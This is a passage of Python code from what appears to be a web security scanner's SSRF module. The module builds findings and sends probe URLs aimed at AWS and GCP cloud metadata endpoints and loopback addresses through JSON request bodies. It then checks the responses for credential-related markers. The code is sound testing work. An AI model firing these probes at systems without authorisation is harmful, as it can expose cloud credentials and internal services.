        cat_label = category_labels.get(category, category)

        description = (
            f"Parameter '{param}' is vulnerable to Server-Side Request Forgery "
            f"(SSRF). The server issued a request to a {cat_label} payload "
            f"'{payload}'. "
        )
        if description_extra:
            description += description_extra + " "
        description += (
            "An attacker can leverage this to reach internal services, enumerate "
            "the cloud metadata API (potentially exposing IAM credentials), scan "
            "internal network topology, or exfiltrate sensitive configuration."
        )

        kwargs: Dict[str, Any] = dict(
            vuln_type=VulnType.SSRF,
            title=f"Server-Side Request Forgery (SSRF) — {cat_label.title()}",
            description=description,
            url=url,
            parameter=param,
            payload=payload,
            evidence=evidence,
            method=method,
            confidence=confidence,
            cvss=cvss,
            remediation=_REMEDIATION,
            references=_REFERENCES,
            cwe_id=_CWE,
            owasp_category=_OWASP,
            response_snippet=response_snippet,
        )
        if severity is not None:
            kwargs["severity"] = severity

        return self._build_vuln(**kwargs)

    def _blind_ssrf_advisory(
        self, url: str, params: List[str]
    ) -> Vulnerability:
        """
        INFO-level finding advising the operator to use an out-of-band
        callback server to test for blind SSRF.  Emitted when URL-like
        parameters exist but no active SSRF was confirmed.
        """
        param_list = ", ".join(f"'{p}'" for p in params[:10])
        return self._build_vuln(
            vuln_type=VulnType.SSRF,
            title="Potential Blind SSRF — Out-of-Band Testing Required",
            description=(
                f"Parameters {param_list} accept URL-like values and may be "
                f"vulnerable to blind SSRF. Active probes did not return "
                f"detectable metadata in the HTTP response, which is common "
                f"when the server makes the request asynchronously or does not "
                f"reflect the response body.\n\n"
                f"To confirm blind SSRF, re-run the scan with an out-of-band "
                f"callback server:\n"
                f"  • Burp Suite Collaborator (Burp Pro)\n"
                f"  • interactsh  (https://github.com/projectdiscovery/interactsh)\n"
                f"  • canarytokens.org\n\n"
                f"Replace payload URLs with your callback domain and monitor "
                f"for DNS lookups and HTTP callbacks."
            ),
            url=url,
            severity=Severity.INFO,
            confidence="Low",
            remediation=_REMEDIATION,
            references=_REFERENCES + [
                "https://github.com/projectdiscovery/interactsh",
            ],
            cwe_id=_CWE,
            owasp_category=_OWASP,
        )

    # ------------------------------------------------------------------
    # JSON body SSRF injection (REST APIs)
    # ------------------------------------------------------------------

    async def _test_json_body_ssrf(
        self, url: str, response: "HTTPResponse"
    ) -> list:
        """Inject SSRF payloads into JSON body fields of REST API endpoints."""
        import json as _json

        try:
            data = _json.loads(response.text)
        except Exception:
            data = {}

        if not isinstance(data, dict):
            data = {}

        # URL-like fields or common SSRF-relevant field names
        field_names = [
            k for k in data.keys()
            if isinstance(data[k], str) and (
                "url" in k.lower() or "uri" in k.lower() or
                "link" in k.lower() or "href" in k.lower() or
                "src" in k.lower() or "endpoint" in k.lower()
            )
        ]
        if not field_names:
            field_names = ["url", "uri", "endpoint", "callback", "webhook", "target"]

        # Probes: internal IPs and metadata endpoints
        ssrf_probes = [
            "http://169.254.169.254/latest/meta-data/",          # AWS IMDS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://localhost/",
            "http://0.0.0.0/",
        ]

        for field in field_names:
            for probe in ssrf_probes:
                test_body = dict(data)
                test_body[field] = probe

                resp = await self.client.post(
                    url,
                    json=test_body,
                    headers={"Content-Type": "application/json"},
                )
                if resp is None:
                    continue

                # Detect cloud metadata response
                if any(s in resp.text for s in [
                    "ami-id", "instance-id", "computeMetadata",
                    "iam/security-credentials", "user-data",
                ]):
                    return [self._build_vuln(
                        vuln_type=VulnType.SSRF,
                        title="SSRF via JSON Body — Cloud Metadata Access",
                        description=(
                            f"JSON field '{field}' at {url} can be used to trigger "
                            f"SSRF to internal/cloud metadata services via POST body. "
                            f"The probe URL '{probe}' received a response containing "
                            f"cloud metadata."
                        ),
                        url=url,
                        parameter=field,
                        payload=_json.dumps({field: probe}),
                        evidence=self._snippet(resp.text, 300),
                        method="POST",
                        severity=Severity.CRITICAL,
                        remediation=(
                            "Validate and allowlist URLs before fetching. "
                            "Block access to IMDS from application servers. "
                            "Use IMDSv2 with PUT-first token requirement."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                            "https://cwe.mitre.org/data/definitions/918.html",
                        ],
                        cwe_id="CWE-918",
                        owasp_category="A10:2021 - Server-Side Request Forgery",
                        confidence="High",
                    )]
        return []
